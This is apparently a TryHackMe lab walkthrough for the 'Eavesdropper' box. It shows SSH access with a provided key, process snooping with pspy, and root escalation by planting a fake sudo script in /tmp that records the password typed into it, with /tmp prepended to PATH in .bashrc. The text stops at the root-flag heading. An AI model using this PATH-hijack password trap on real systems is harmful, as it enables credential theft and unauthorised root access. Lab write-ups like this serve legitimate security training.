<img width="1082" height="930" alt="image" src="https://github.com/user-attachments/assets/6b6463d7-b6a0-4bd1-821c-e455c1f8aa1e" />## Eavesdropper --Tryhackme walkthrough


Task 1
Download Keys

Download Task Files
Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.

Download the SSH private key attached.

Note: If you are using the AttackBox, you can copy and paste the SSH private key using the "Clipboard" icon located on the slide-out tray, as demonstrated by the GIF below:


Task 2
Find the Flag

Start Machine
You have access under frank, but you want to be root! How can you escalate privileges? If you listen closely, maybe you can uncover something that might help!

Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge.

Answer the questions below
What is the flag in root's home directory?



Initial Access 
as lab already provided id rsa of user frank let ssh into it 

Giving perm to id rsa
```
chmod 600 id-rsa-1647296932800.id-rsa
```
Let login to ssh
```
ssh frank@<ip> -i id-rsa-1647296932800.id-rsa
```

Since this box is named Eavesdropper, let’s have a look at running processes. To view processes run by other users and even the root user, we need to transfer the pspy64 binary to the machine. The next step is to transfer binary into frank system as we have ssh we can do scp 
```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
scp -i id-rsa-1647296932800.id-rsa pspy64 frank@<IP>:.
```
In frank system give execution permission to `pspy64` and execute the binary
```
chmod +x pspy64 
./pspy64 
```
After running these commands, you will see the processes running on the box popping up one after the other. The most interesting process is the following one:

CMD: UID=0     PID=662    | sudo cat /etc/shadow

<img width="1082" height="930" alt="image" src="https://github.com/user-attachments/assets/3dced6ae-009d-4767-b747-0c7a57c6bd71" />

What we discover: A cron job runs sudo cat /etc/shadow when any users SSH login, but it doesn't use full paths.
This is weird, why root would use sudo? Looks like root is connecting through SSH to frank account. There is probably a cron job executing sudo in a unattended way so we'll be able to capture root password by capturing the intput. To do so we just have to change frank's PATH so a rogue sudo command would be executed.

## pRIVILLAGE eSCASLATION
So let's prepare sudo hijacking.

The content of the fake sudo will read the input to capture root password. copy past
```
cat > /tmp/sudo << 'EOF'
#!/bin/bash
read -p "Test" password
echo $password > /home/frank/pass.txt
EOF
```
What this going to do
read -p "Test" password
→ shows the text Test and waits for user input.
The input gets stored in the variable password.
echo $password > /home/frank/pass.txt
→ writes whatever the user typed into /home/frank/pass.txt.

set exc perm
```
chmod +x /tmp/sudo
```
Then we change frank's PATH so that the fake sudo will be loaded before the real one.
```
sed -i '4iPATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin' ~/.bashrc
```
Check it:
```
head -n 6 ~/.bashrc
```
Reload:
```
source ~/.bashrc
```
## Trigger the Exploit
```
exit
ssh -i id-rsa-1647296932800.id-rsa frank@<IP>
```

What happens:

When we login, the cron job runs sudo cat /etc/shadow
Because /tmp is first in PATH, it finds our fake sudo script
Our script captures the password and saves it

## Captyuring the Root Flag

